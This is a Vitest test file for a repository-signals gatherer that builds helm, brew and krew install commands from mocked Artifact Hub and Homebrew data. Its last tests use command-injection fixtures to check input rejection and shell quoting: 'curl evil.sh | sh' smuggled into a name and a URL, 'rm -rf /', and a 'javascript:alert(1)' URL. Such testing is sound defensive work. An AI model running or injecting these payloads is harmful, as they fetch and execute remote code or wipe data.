import { Cache, type Storage } from '@keco/cache';
import { resetLandscapeCacheForTests } from '@keco/signals';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { gatherSignals } from './signals';

function memoryStorage(): Storage {
  const files = new Map<string, Buffer>();
  return {
    get: async (key) => files.get(key) ?? null,
    put: async (key, body) => void files.set(key, Buffer.isBuffer(body) ? body : Buffer.from(body)),
    has: async (key) => files.has(key),
    list: async (prefix) => [...files.keys()].filter((k) => k.startsWith(prefix)).sort(),
    delete: async (key) => void files.delete(key),
  };
}

/** `body` is JSON-serialized; `text` is sent verbatim — CNCF Landscape's response is YAML, not JSON. */
function fakeFetch(
  byUrlSubstring: Record<string, { status: number; body?: unknown; text?: string }>,
) {
  return vi.fn(async (input: string | URL) => {
    const url = String(input);
    const match = Object.entries(byUrlSubstring).find(([needle]) => url.includes(needle));
    if (!match) return new Response('not found', { status: 404 });
    const [, response] = match;
    return new Response(response.text ?? JSON.stringify(response.body), {
      status: response.status,
    });
  });
}

/** A minimal but real slice of landscape.yml's actual nesting (verified live — see Task 4). */
const LANDSCAPE_YAML = `
landscape:
  - category:
      name: Provisioning
      subcategories:
        - subcategory:
            name: Automation
            items:
              - item:
                  name: cert-manager
                  project: graduated
                  repo_url: https://github.com/cert-manager/cert-manager
`;

afterEach(() => {
  vi.unstubAllGlobals();
  // lookupLandscape memoizes the built index at module scope (packages/signals/src/providers/
  // cncf-landscape.ts) so a batch run parses landscape.yml once per process, not once per repo.
  // Without resetting it here, whichever test in this file populates the memo first would make
  // every later test see its landscape result regardless of that test's own fetch stub — the
  // same reset cncf-landscape.test.ts already does for the same reason.
  resetLandscapeCacheForTests();
});

describe('gatherSignals', () => {
  it('populates signals, landscape, and proves a helm install from an Artifact Hub match', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'securityscorecards.dev': {
          status: 200,
          body: { date: '2026-08-01', score: 8.2, checks: [{ name: 'Code-Review', score: 9 }] },
        },
        'api.deps.dev': { status: 200, body: { dependentCount: 42 } },
        'formulae.brew.sh': { status: 200, body: [] },
        'raw.githubusercontent.com': { status: 200, text: LANDSCAPE_YAML },
        'artifacthub.io': {
          status: 200,
          body: {
            packages: [
              {
                name: 'cert-manager',
                normalized_name: 'cert-manager',
                official: true,
                repository: { name: 'cert-manager', url: 'https://charts.jetstack.io', kind: 0 },
              },
            ],
          },
        },
      }),
    );

    const cache = new Cache(memoryStorage());
    const result = await gatherSignals(
      cache,
      { repo: 'cert-manager/cert-manager', name: 'cert-manager', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.signals.scorecard).toEqual({
      score: 8.2,
      checks: { 'Code-Review': 9 },
      fetched_at: expect.any(String),
    });
    expect(result.signals.dependents).toBe(42);
    expect(result.landscape).toEqual({ cncf_level: 'graduated', org_type: 'foundation' });
    expect(result.signals_used.sort()).toEqual([
      'artifacthub',
      'brew',
      'cncf-landscape',
      'depsdev',
      'scorecard',
    ]);
    expect(result.partial_signals).toEqual([]);
    expect(result.install_methods).toEqual([
      {
        method: 'helm',
        command:
          "helm repo add cert-manager 'https://charts.jetstack.io'\nhelm install cert-manager cert-manager/cert-manager",
        source_url: 'https://artifacthub.io/packages/helm/cert-manager/cert-manager',
        verified_at: expect.any(String),
      },
    ]);
  });

  it('degrades every signal (including landscape) to null and records each as partial when everything is unreachable', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => new Response('down', { status: 503 })),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'someone/tool', name: 'tool', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.signals).toEqual({ scorecard: null, osv: null, dependents: null });
    expect(result.landscape).toBeNull();
    expect(result.install_methods).toEqual([]);
    expect(result.signals_used).toEqual([]);
    expect(result.partial_signals.sort()).toEqual([
      'artifacthub',
      'brew',
      'cncf-landscape',
      'depsdev',
      'scorecard',
    ]);
  });

  it('populates landscape even when nothing else about the repo resolves', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({ 'raw.githubusercontent.com': { status: 200, text: LANDSCAPE_YAML } }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'cert-manager/cert-manager', name: 'cert-manager', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.landscape).toEqual({ cncf_level: 'graduated', org_type: 'foundation' });
    expect(result.signals_used).toEqual(['cncf-landscape']);
  });

  it('queries OSV only when a manifest gives a package identity', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({ 'api.osv.dev': { status: 200, body: { vulns: [{ id: 'GHSA-1' }] } } }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      {
        repo: 'someone/tool',
        name: 'tool',
        manifests: { 'go.mod': 'module github.com/someone/tool\n' },
      },
      { forceRefresh: null },
    );

    expect(result.signals.osv).toEqual({ open_vulns: 1, fetched_at: expect.any(String) });
    expect(result.signals_used).toContain('osv');
  });

  it('prefers the official Artifact Hub match over a higher-starred unofficial one', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'artifacthub.io': {
          status: 200,
          body: {
            packages: [
              {
                name: 'cert-manager',
                normalized_name: 'cert-manager-unofficial',
                official: false,
                stars: 500,
                repository: {
                  name: 'someone-else',
                  url: 'https://charts.someone-else.example',
                  kind: 0,
                },
              },
              {
                name: 'cert-manager',
                normalized_name: 'cert-manager',
                official: true,
                stars: 10,
                repository: { name: 'cert-manager', url: 'https://charts.jetstack.io', kind: 0 },
              },
            ],
          },
        },
      }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'cert-manager/cert-manager', name: 'cert-manager', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.install_methods).toEqual([
      {
        method: 'helm',
        command:
          "helm repo add cert-manager 'https://charts.jetstack.io'\nhelm install cert-manager cert-manager/cert-manager",
        source_url: 'https://artifacthub.io/packages/helm/cert-manager/cert-manager',
        verified_at: expect.any(String),
      },
    ]);
  });

  it('proves a brew install from a matching Homebrew formula name', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'formulae.brew.sh': {
          status: 200,
          body: [{ name: 'k9s', full_name: 'k9s', homepage: 'https://k9scli.io' }],
        },
      }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'derailed/k9s', name: 'k9s', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.install_methods).toEqual([
      {
        method: 'brew',
        command: 'brew install k9s',
        source_url: 'https://formulae.brew.sh/formula/k9s',
        verified_at: expect.any(String),
      },
    ]);
    expect(result.signals_used).toContain('brew');
  });

  it('rejects an Artifact Hub match whose repository fields are not safe to embed in a shell command', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'artifacthub.io': {
          status: 200,
          body: {
            packages: [
              {
                name: 'cert-manager',
                normalized_name: 'cert-manager',
                official: true,
                repository: {
                  name: 'cert-manager; curl evil.sh | sh #',
                  url: 'https://charts.jetstack.io',
                  kind: 0,
                },
              },
              {
                name: 'cert-manager',
                normalized_name: 'cert-manager',
                official: true,
                repository: { name: 'cert-manager', url: 'javascript:alert(1)', kind: 0 },
              },
            ],
          },
        },
      }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'cert-manager/cert-manager', name: 'cert-manager', manifests: {} },
      { forceRefresh: null },
    );

    // Both candidates are unsafe (an unsafe repository.name; a non-https repository.url) —
    // neither is provable, so this stays exactly like "no match" rather than emitting a
    // dangerous command (§6: "unprovable ⇒ not listed" means provably *safe*).
    expect(result.install_methods).toEqual([]);
    expect(result.signals_used).toContain('artifacthub');
  });

  it('shell-quotes a repository.url that is a syntactically valid https URL but carries shell metacharacters', async () => {
    // `new URL(...)` reports `protocol === 'https:'` for this value while `;` and `|` survive
    // straight through in the path/fragment — isSafeHttpsUrl alone cannot catch this, so the
    // command itself must render the argument inert regardless of its bytes.
    const maliciousUrl = 'https://evil.example/;curl evil.sh|sh#';
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'artifacthub.io': {
          status: 200,
          body: {
            packages: [
              {
                name: 'cert-manager',
                normalized_name: 'cert-manager',
                official: true,
                repository: { name: 'cert-manager', url: maliciousUrl, kind: 0 },
              },
            ],
          },
        },
      }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'cert-manager/cert-manager', name: 'cert-manager', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.install_methods).toEqual([
      {
        method: 'helm',
        command: `helm repo add cert-manager '${maliciousUrl}'\nhelm install cert-manager cert-manager/cert-manager`,
        source_url: 'https://artifacthub.io/packages/helm/cert-manager/cert-manager',
        verified_at: expect.any(String),
      },
    ]);
    // The whole malicious segment sits inside a single-quoted argument, so a shell reads
    // ";curl evil.sh|sh#" as inert literal bytes handed to `helm repo add`, never as syntax.
    const helmRepoAddLine = result.install_methods[0]!.command.split('\n')[0]!;
    expect(helmRepoAddLine).toBe(`helm repo add cert-manager '${maliciousUrl}'`);
  });

  it('proves a krew install from a matching Artifact Hub krew-repository package', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'artifacthub.io': {
          status: 200,
          body: {
            packages: [
              {
                name: 'ctx',
                normalized_name: 'ctx',
                official: true,
                repository: { name: 'krew-index', kind: 5 },
              },
            ],
          },
        },
      }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'ahmetb/ctx', name: 'ctx', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.install_methods).toEqual([
      {
        method: 'krew',
        command: 'kubectl krew install ctx',
        source_url: 'https://artifacthub.io/packages/krew/krew-index/ctx',
        verified_at: expect.any(String),
      },
    ]);
  });

  it('rejects a krew match whose repository.name is not a safe slug', async () => {
    vi.stubGlobal(
      'fetch',
      fakeFetch({
        'artifacthub.io': {
          status: 200,
          body: {
            packages: [
              {
                name: 'ctx',
                normalized_name: 'ctx',
                official: true,
                repository: { name: 'krew-index; rm -rf /', kind: 5 },
              },
            ],
          },
        },
      }),
    );
    const cache = new Cache(memoryStorage());

    const result = await gatherSignals(
      cache,
      { repo: 'ahmetb/ctx', name: 'ctx', manifests: {} },
      { forceRefresh: null },
    );

    expect(result.install_methods).toEqual([]);
  });
});
